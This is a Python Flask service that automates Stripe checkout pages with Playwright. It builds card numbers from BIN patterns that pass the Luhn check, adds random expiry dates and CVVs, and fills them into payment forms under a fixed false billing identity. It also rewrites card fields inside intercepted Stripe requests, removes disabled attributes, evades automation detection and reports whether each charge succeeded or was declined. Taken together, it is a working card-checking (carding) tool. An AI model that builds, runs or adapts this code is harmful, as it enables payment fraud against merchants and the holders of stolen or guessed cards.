import os
import asyncio
import json
import random
import re
from datetime import datetime
from playwright.async_api import async_playwright, Error as PlaywrightError
from flask import Flask, request, jsonify
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "RESPONSE_TIMEOUT_SECONDS": 30,
    "RETRY_DELAY": 7000  # milliseconds
}

if not CONFIG["RUN_LOCAL"] and not CONFIG["BROWSERLESS_API_KEY"]:
    raise ValueError("BROWSERLESS_API_KEY must be set for headless mode!")

app = Flask(__name__)

# === CARD GENERATION UTILITIES (FROM YOUR CHROME EXTENSION) ===
def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    """Determine card length based on BIN"""
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    first_four = bin_str[:4] if len(bin_str) >= 4 else ""
    
    # American Express
    if first_two in ['34', '37']:
        return 15
    # Diners Club
    if first_two == '36' or first_two == '38':
        return 14
    # Discover
    if first_four == '6011' or first_two == '65':
        return 16
    # Mastercard
    if (first_two >= '51' and first_two <= '55') or (first_four >= '2221' and first_four <= '2720'):
        return 16
    # Visa (default)
    return 16

def get_cvv_length(card_number):
    """Get CVV length based on card number"""
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    """Generate card from pattern with x placeholders"""
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        if char.lower() == 'x':
            result += random_digit()
        else:
            result += char
    
    # Fill remaining digits
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    """Process card with xx placeholders"""
    # Process number
    if 'x' in number.lower():
        processed_number = generate_card_from_pattern(number)
    else:
        processed_number = number
    
    # Process month
    if 'x' in month.lower():
        processed_month = str(random.randint(1, 12)).zfill(2)
    else:
        processed_month = month.zfill(2)
    
    # Process year
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    # Process CVV
    cvv_length = get_cvv_length(processed_number)
    if 'x' in cvv.lower():
        processed_cvv = ''.join([random_digit() for _ in range(cvv_length)])
    else:
        processed_cvv = cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    """Process card input string"""
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    
    number, month, year, cvv = parts
    return process_card_with_placeholders(number, month, year, cvv)

# === MAIN AUTOMATION FUNCTION ===
async def run_stripe_automation(url, cc_string, email=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format. Use: number|month|year|cvv"}
    
    # Default email if not provided
    if not email:
        email = f"test{random.randint(1000,9999)}@example.com"
    
    print(f"\n[INFO] Starting automation...")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | CVV: {card['cvv']}")
    print(f"[EMAIL] {email}")
    
    async with async_playwright() as p:
        # Connect to browser
        try:
            if CONFIG["RUN_LOCAL"]:
                browser = await p.chromium.launch(
                    headless=False, 
                    slow_mo=100,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-web-security'
                    ]
                )
            else:
                browser_url = f"wss://production-sfo.browserless.io?token={CONFIG['BROWSERLESS_API_KEY']}"
                browser = await p.chromium.connect_over_cdp(browser_url, timeout=60000)
            print("[SUCCESS] Browser connected")
        except Exception as e:
            return {"error": "Failed to connect to browser", "details": str(e)}
        
        # Create context with proper user agent
        context = await browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            extra_http_headers={
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            }
        )
        
        page = await context.new_page()
        
        # Enhanced response capture
        stripe_result = {"status": "pending"}
        
        async def capture_response(response):
            try:
                url_lower = response.url.lower()
                # Check for various Stripe endpoints (based on your Chrome extension)
                if any(endpoint in url_lower for endpoint in [
                    'payment_intents', 'tokens', 'sources', 'customers',
                    'setup_intents', 'payment_methods', 'confirm'
                ]):
                    if response.status >= 200 and response.status < 300:
                        try:
                            data = await response.json()
                            stripe_result["response"] = data
                            stripe_result["status"] = "captured"
                            
                            # Check for success indicators
                            if data.get('status') in ['succeeded', 'success']:
                                stripe_result["success"] = True
                            elif data.get('payment_intent', {}).get('status') in ['succeeded', 'success']:
                                stripe_result["success"] = True
                            
                            print(f"[CAPTURED] Stripe response from: {response.url}")
                        except:
                            pass
            except:
                pass
        
        # Attach response listener
        page.on("response", capture_response)
        
        # Also intercept requests to modify card data
        async def handle_route(route):
            if 'stripe.com' in route.request.url and route.request.method == "POST":
                post_data = route.request.post_data
                if post_data and ('card[number]' in post_data or 'cardNumber' in post_data):
                    # Parse and modify the post data
                    params = {}
                    for pair in post_data.split('&'):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            params[key] = value
                    
                    # Update card details
                    if 'card[number]' in params:
                        params['card[number]'] = card['number']
                        params['card[exp_month]'] = card['month']
                        params['card[exp_year]'] = card['year']
                        params['card[cvc]'] = card['cvv']
                    
                    # Reconstruct post data
                    new_post_data = '&'.join([f"{k}={v}" for k, v in params.items()])
                    await route.continue_(post_data=new_post_data)
                    print("[INTERCEPTED] Modified card data in POST request")
                    return
            
            await route.continue_()
        
        # Set up request interception
        await page.route("**/*", handle_route)
        
        try:
            # Navigate to the page
            print(f"[NAVIGATE] Loading: {url}")
            await page.goto(url, wait_until="domcontentloaded", timeout=60000)
            await page.wait_for_timeout(3000)  # Wait for JS to load
            
            # Address/billing data (from your Chrome extension)
            address_data = {
                'name': 'Vclub Tech',
                'addressLine1': '123 Main Street',
                'addressLine2': 'OK',
                'city': 'Macao',
                'country': 'MO',
                'state': 'Macau',
                'postalCode': '999078'
            }
            
            # Check for iframes (Stripe Elements often use iframes)
            frames = page.frames
            print(f"[INFO] Found {len(frames)} frames on page")
            
            # Try to fill fields in all frames
            for frame in frames:
                frame_url = frame.url
                print(f"[FRAME] Processing frame: {frame_url[:50]}...")
                
                # Email fields (from your Chrome extension selectors)
                email_selectors = [
                    'input[type="email"]',
                    'input[name="email"]',
                    'input[id="email"]',
                    'input[placeholder*="email" i]',
                    'input[autocomplete="email"]',
                    'input[name="billingEmail"]',
                    '#email'
                ]
                
                for selector in email_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.click()
                                await element.fill('')
                                await element.type(email, delay=50)
                                print(f"[FILLED] Email in frame")
                                break
                    except:
                        continue
                
                # Card number fields (extensive selectors from your extension)
                card_selectors = [
                    'input[name="cardnumber"]',
                    'input[name="cardNumber"]',
                    'input[id="cardNumber"]',
                    'input[placeholder*="Card number" i]',
                    'input[placeholder*="1234" i]',
                    'input[autocomplete="cc-number"]',
                    'input[data-elements-stable-field-name="cardNumber"]',
                    'input[aria-label*="Card" i]',
                    '#Field-numberInput',
                    'input[name="number"]',
                    'input[inputmode="numeric"]'
                ]
                
                for selector in card_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.click()
                                await element.fill('')
                                await element.type(card['number'], delay=50)
                                print(f"[FILLED] Card number in frame")
                                break
                    except:
                        continue
                
                # Expiry fields (combined and separate)
                expiry_selectors = [
                    'input[name="cc-exp"]',
                    'input[name="cardExpiry"]',
                    'input[name="exp-date"]',
                    'input[placeholder*="MM / YY" i]',
                    'input[placeholder*="MM/YY" i]',
                    'input[autocomplete="cc-exp"]',
                    '#Field-expiryInput',
                    'input[data-elements-stable-field-name="cardExpiry"]'
                ]
                
                for selector in expiry_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                expiry_value = f"{card['month']}/{card['year'][-2:]}"
                                await element.click()
                                await element.fill('')
                                await element.type(expiry_value, delay=50)
                                print(f"[FILLED] Expiry in frame")
                                break
                    except:
                        continue
                
                # CVV/CVC fields
                cvc_selectors = [
                    'input[name="cvc"]',
                    'input[name="cvv"]',
                    'input[name="cardCvc"]',
                    'input[name="securityCode"]',
                    'input[placeholder*="CVC" i]',
                    'input[placeholder*="CVV" i]',
                    'input[autocomplete="cc-csc"]',
                    '#Field-cvcInput',
                    'input[data-elements-stable-field-name="cardCvc"]'
                ]
                
                for selector in cvc_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.click()
                                await element.fill('')
                                await element.type(card['cvv'], delay=50)
                                print(f"[FILLED] CVV in frame")
                                break
                    except:
                        continue
                
                # Name fields
                name_selectors = [
                    'input[name="billingName"]',
                    'input[name="name"]',
                    'input[autocomplete*="name"]',
                    'input[placeholder*="Name" i]',
                    '#Field-nameInput'
                ]
                
                for selector in name_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.fill(address_data['name'])
                                break
                    except:
                        continue
                
                # Address fields
                address_selectors = [
                    'input[name="billingAddressLine1"]',
                    'input[name="addressLine1"]',
                    'input[autocomplete*="address-line1"]',
                    'input[placeholder*="Address" i]'
                ]
                
                for selector in address_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.fill(address_data['addressLine1'])
                                break
                    except:
                        continue
                
                # City fields
                city_selectors = [
                    'input[name="billingLocality"]',
                    'input[name="city"]',
                    'input[autocomplete*="city"]',
                    'input[placeholder*="City" i]'
                ]
                
                for selector in city_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.fill(address_data['city'])
                                break
                    except:
                        continue
                
                # Postal code fields
                postal_selectors = [
                    'input[name="billingPostalCode"]',
                    'input[name="postalCode"]',
                    'input[name="zipCode"]',
                    'input[name="postal"]',
                    'input[name="zip"]',
                    'input[placeholder*="ZIP" i]',
                    'input[placeholder*="Postal" i]',
                    'input[autocomplete="postal-code"]',
                    '#Field-postalCodeInput'
                ]
                
                for selector in postal_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.fill(address_data['postalCode'])
                                print(f"[FILLED] Postal code in frame")
                                break
                    except:
                        continue
                
                # Country fields (dropdowns)
                country_selectors = [
                    'select[name="billingCountry"]',
                    'select[name="country"]',
                    'select[autocomplete*="country"]'
                ]
                
                for selector in country_selectors:
                    try:
                        elements = await frame.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.select_option(address_data['country'])
                                break
                    except:
                        continue
            
            # Wait for form validation
            await page.wait_for_timeout(2000)
            
            # Unlock any disabled fields
            await page.evaluate("""
                () => {
                    // Remove disabled and readonly attributes
                    document.querySelectorAll('input[disabled], select[disabled], button[disabled]').forEach(el => {
                        el.removeAttribute('disabled');
                        el.removeAttribute('readonly');
                    });
                    
                    // Also check in iframes
                    document.querySelectorAll('iframe').forEach(iframe => {
                        try {
                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                            iframeDoc.querySelectorAll('input[disabled], select[disabled], button[disabled]').forEach(el => {
                                el.removeAttribute('disabled');
                                el.removeAttribute('readonly');
                            });
                        } catch(e) {
                            // Cross-origin iframe
                        }
                    });
                }
            """)
            
            # Submit button selectors (from your Chrome extension)
            submit_selectors = [
                '.SubmitButton',
                'button[type="submit"]',
                'input[type="submit"]',
                'button[data-testid="hosted-payment-submit-button"]',
                'button:has-text("Pay")',
                'button:has-text("Complete")',
                'button:has-text("Submit")',
                '#submit',
                'button.Button--primary',
                'button[class*="CheckoutButton"]',
                'button[class*="SubmitButton"]'
            ]
            
            button_clicked = False
            
            # Try clicking submit button in all frames
            for frame in frames:
                if button_clicked:
                    break
                    
                for selector in submit_selectors:
                    try:
                        button = frame.locator(selector).first
                        if await button.is_visible(timeout=1000):
                            # Scroll into view
                            await button.scroll_into_view_if_needed()
                            await page.wait_for_timeout(500)
                            
                            # Try different click methods
                            try:
                                await button.click(force=True)
                            except:
                                await button.dispatch_event('click')
                            
                            print(f"[CLICKED] Submit button: {selector}")
                            button_clicked = True
                            break
                    except:
                        continue
            
            # If no button clicked, try Enter key
            if not button_clicked:
                print("[WARNING] No submit button found, pressing Enter...")
                await page.keyboard.press("Enter")
            
            # Wait for response with retry mechanism
            print("[WAITING] Waiting for Stripe API response...")
            max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
            retry_count = 0
            max_retries = 3
            
            while retry_count < max_retries:
                # Wait for response
                for _ in range(max_wait * 2):
                    if stripe_result["status"] == "captured":
                        if stripe_result.get("success"):
                            return {
                                "success": True,
                                "message": "Payment successful",
                                "data": stripe_result["response"]
                            }
                        else:
                            # Check for specific error messages
                            response = stripe_result.get("response", {})
                            error = response.get("error", {})
                            if error:
                                return {
                                    "success": False,
                                    "error": error.get("message", "Payment declined"),
                                    "code": error.get("code", "unknown"),
                                    "data": response
                                }
                    await asyncio.sleep(0.5)
                
                # If no response, try clicking submit again
                retry_count += 1
                if retry_count < max_retries:
                    print(f"[RETRY] Attempt {retry_count + 1} - Clicking submit again...")
                    await page.wait_for_timeout(CONFIG["RETRY_DELAY"])
                    
                    # Try to click submit button again
                    for selector in submit_selectors:
                        try:
                            button = page.locator(selector).first
                            if await button.is_visible(timeout=500):
                                await button.click(force=True)
                                break
                        except:
                            continue
            
            # Check if redirected to success page
            current_url = page.url
            if any(success_indicator in current_url for success_indicator in [
                'success', 'thank', 'complete', 'confirm', 'receipt'
            ]):
                return {
                    "success": True,
                    "message": "Payment completed - redirected to success page",
                    "redirect_url": current_url
                }
            
            return {
                "error": "Timeout waiting for Stripe response",
                "details": "Payment may not have been submitted or Stripe did not respond"
            }
            
        except Exception as e:
            return {"error": "Automation failed", "details": str(e)}
        
        finally:
            await browser.close()
            print("[CLEANUP] Browser closed")

# === API ENDPOINT ===
@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    url = request.args.get('url')
    cc = request.args.get('cc')
    email = request.args.get('email')
    
    print(f"\n{'='*60}")
    print(f"NEW REQUEST: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"URL: {url}")
    print(f"CC: {cc}")
    print(f"Email: {email}")
    print('='*60)
    
    if not url or not cc:
        return jsonify({"error": "Missing required parameters: url and cc"}), 400
    
    # Run async function
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(run_stripe_automation(url, cc, email))
        
        print("\n--- STRIPE RESPONSE ---")
        print(json.dumps(result, indent=2))
        print("-" * 40)
        
        if result.get('success'):
            return jsonify(result), 200
        elif 'error' in result:
            return jsonify(result), 400
        else:
            return jsonify(result), 200
        
    finally:
        loop.close()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    app.run(host='0.0.0.0', port=port)
